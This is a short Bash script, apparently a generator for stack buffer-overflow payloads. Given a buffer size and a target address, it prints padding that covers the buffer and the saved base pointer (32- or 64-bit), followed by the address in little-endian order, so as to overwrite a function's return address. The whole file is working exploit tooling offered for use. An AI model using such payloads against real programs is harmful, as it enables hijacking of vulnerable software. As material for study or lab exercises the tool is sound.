#!/bin/bash

get_raw_address() {

    local hexAddress="${1}"
    local hexAddressLength=${#hexAddress}
    local byte=""
    local bytes=()
    local bytesSize=""
    local bytesIndex=""
    local assembledBytes=""

    if [ $(( ${hexAddressLength} % 2 )) -eq 0 2> /dev/null ]
    then
        bytesSize=$(( ${hexAddressLength} / 2 - 1))
        bytesIndex=${bytesSize}
    else
        echo "[ERROR] Invalid hexadecimal address."
        exit 1
    fi

    # Reverse the hex address for little-endian systems.
    for i in $(seq 1 ${hexAddressLength}); do

        byte="${byte}${hexAddress:i-1:1}"

        if [ $(( ${i} % 2 )) -eq 0 2> /dev/null ]
        then
            byte="\x${byte}"
            bytes[${bytesIndex}]="${byte}"
            byte=""
            ((bytesIndex--))
        fi

    done

    for byte in "${bytes[@]}"; do

        assembledBytes="${assembledBytes}${byte}"

    done

    echo -e "${assembledBytes}"

}

get_repeated_string() {

    local repeatCount=${1}
    local charToRepeat="a"
    local finalString=""

    if [ "${repeatCount}" -eq "${repeatCount}" 2> /dev/null ]
    then
        for i in $(seq 1 ${repeatCount}); do

            finalString="${finalString}${charToRepeat}"

        done
    else
        finalString="${charToRepeat}"
    fi

    echo "${finalString}"

}


get_payload() {

    local hexAddress="${1}"
    local bufferSizeInBytes=${2}
    local basePointerSizeInBytes=4
    if [ -n ${BO_TARGET_ARCH} ] && [ ${BO_TARGET_ARCH} -eq 64 2> /dev/null ]
    then
        basePointerSizeInBytes=8
    fi
    local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${basePointerSizeInBytes} ))
    local rawAddress="$(get_raw_address ${hexAddress})"
    local payload="$(get_repeated_string ${totalOverwriteSize})${rawAddress}"

    echo "${payload}"

}

targetHexAddress="${1}"
bufferSize="${2}"

get_payload "${targetHexAddress}" "${bufferSize}"

exit
